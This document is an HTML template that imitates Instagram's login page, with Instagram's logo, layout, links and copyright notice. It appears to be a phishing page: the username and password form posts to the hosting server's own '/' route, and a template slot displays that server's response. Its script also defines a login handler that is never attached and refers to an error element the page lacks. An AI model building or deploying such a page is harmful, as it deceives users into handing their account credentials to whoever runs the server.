<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        :root {
            --bg-color: #fafafa;
            --card-bg: #ffffff;
            --text-color: #262626;
            --button-bg: #0095f6;
            --border-color: #dbdbdb;
            --secondary-text: #8e8e8e;
            --link-color: #00376b;
            --fb-blue: #385185;
            --footer-text: #737373;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color: #000000;
                --card-bg: #000000;
                --text-color: #f5f5f5;
                --button-bg: #0095f6;
                --border-color: #363636;
                --secondary-text: #a8a8a8;
                --link-color: #e0f1ff;
                --fb-blue: #8cb4f6;
                --footer-text: #a8a8a8;
            }
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            text-decoration: none;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-color);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px 0 60px;
            font-size: 16px; 
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 400px;
            width: 100%;
            flex-grow: 1;
            justify-content: center;
        }

        .login-card {
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px; 
            padding: 30px 40px; 
            margin-bottom: 15px;
            width: 100%;
            text-align: center;
        }

        .logo {
            margin: 20px auto 30px;
            width: 200px; 
            display: none;
        }

        .light-logo {
            display: block;
        }

        .dark-logo {
            filter: invert(1);
            display: block !important;
        }

        @media (prefers-color-scheme: dark) {
            .light-logo {
                display: none;
            }
            .dark-logo {
                display: block;
            }
        }

        .form-group {
            margin-bottom: 12px; 
            position: relative;
        }

        input {
            width: 100%;
            padding: 14px 12px;
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 6px; 
            color: var(--text-color);
            font-size: 16px; 
        }

        input:focus {
            outline: none;
            border-color: #a8a8a8;
        }

        .login-button {
            width: 100%;
            background-color: var(--button-bg);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 12px 16px; 
            font-weight: 600;
            margin: 12px 0; 
            cursor: pointer;
            opacity: 0.7;
            font-size: 16px; 
        }

        .login-button.active {
            opacity: 1;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 16px 0 24px; 
            color: var(--secondary-text);
            font-size: 16px;
            font-weight: 600;
        }

        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid var(--border-color);
        }

        .divider::before {
            margin-right: 20px; 
        }

        .divider::after {
            margin-left: 20px; 
        }

        .facebook-login {
            color: var(--fb-blue);
            font-weight: 600;
            font-size: 16px; 
            margin: 12px 0 16px; 
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .facebook-login img {
            width: 20px; 
            margin-right: 10px; 
        }

        .forgot-password {
            font-size: 14px; 
            color: var(--link-color);
            margin-top: 16px; 
            display: block;
        }

        .signup-card {
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 24px; 
            width: 100%;
            text-align: center;
            font-size: 16px;
        }

        .signup-card a {
            color: var(--button-bg);
            font-weight: 600;
            font-size: 16px;
        }

        footer {
            width: 100%;
            text-align: center;
            padding: 24px 0;
            font-size: 14px; 
            color: var(--footer-text);
            margin-top: auto;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px; 
            margin-bottom: 16px; 
        }

        .footer-links a {
            color: var(--footer-text);
            font-size: 14px; 
        }

        .copyright {
            margin-top: 16px; 
            font-size: 14px; 
        }

        select {
            font-size: 14px; 
            padding: 4px 8px;
        }

        @media (max-width: 450px) {
            body {
                background-color: var(--card-bg);
                padding: 0 0 60px;
                font-size: 14px; 
            }
            
            .login-card, .signup-card {
                border: none;
                background-color: transparent;
                padding: 20px;
            }
            
            .container {
                max-width: 100%;
                padding: 0 20px;
            }
            
            input {
                font-size: 14px;
                padding: 12px 10px;
            }
            
            .login-button, .signup-card, .signup-card a {
                font-size: 14px;
            }
        }

        .erromsg p {
            color: red;
            text-align: center;
            margin-top: 20px;
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <img 
                src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png" 
                alt="Instagram" 
                class="logo light-logo"
            >
            
            <img 
                src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png" 
                alt="Instagram" 
                class="logo dark-logo"
            >
            
            <form id="loginForm" action="/" method="post">
                <div class="form-group">
                    <input type="text" id="username" name="username" placeholder="Phone number, username, or email" class="input"  minlength="1" required>
                </div>
                <div class="form-group">
                    <input type="password" id="password" name="password" placeholder="Password" class="input" required minlength="6">
                </div>
                <button type="submit" class="login-button">Log in</button>
            </form>
            
            <div class="divider">OR</div>
            
            <a href="https://www.facebook.com/login.php" class="facebook-login">
                Log in with Facebook
            </a>

            <div class="erromsg">
                {% if result %} <p>{{ result }}</p> {% endif %}
            </div>
            
            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>
        </div>
        
        <div class="signup-card">
            Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
        </div>
    </div>
    
    <footer>
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="copyright">
            <select style="background: transparent; color: var(--footer-text); border: none; margin-right: 10px;">
                <option>English</option>
            </select>
            © 2025 Instagram from Meta
        </div>
    </footer>

    <script>
        const inputs = document.querySelectorAll('input');
        const loginButton = document.querySelector('.login-button');

        inputs.forEach(input => {
            input.addEventListener('input', () => {
                const allFilled = Array.from(inputs).every(input => input.value.trim() !== '');
                if (allFilled) {
                    loginButton.classList.add('active');
                } else {
                    loginButton.classList.remove('active');
                }
            });
        });


        async function handleLogin(event) {
        event.preventDefault();

        const form = event.target;
        const formData = new FormData(form);
        const data = new URLSearchParams();
        for (const pair of formData) {
            data.append(pair[0], pair[1]);
        }

        const response = await fetch(form.action, {
            method: 'POST',
            body: data
        });

        const result = await response.json();

        if (result.status === 'success') {
            window.location.href = result.redirect;
        } else {
            const errorMsg = result.error_msg || 'An error occurred.';
            const errorMessageElement = document.getElementById('error-message');
            errorMessageElement.innerText = errorMsg;
            errorMessageElement.style.display = 'block';
        }
    }
    </script>
</body>
</html>
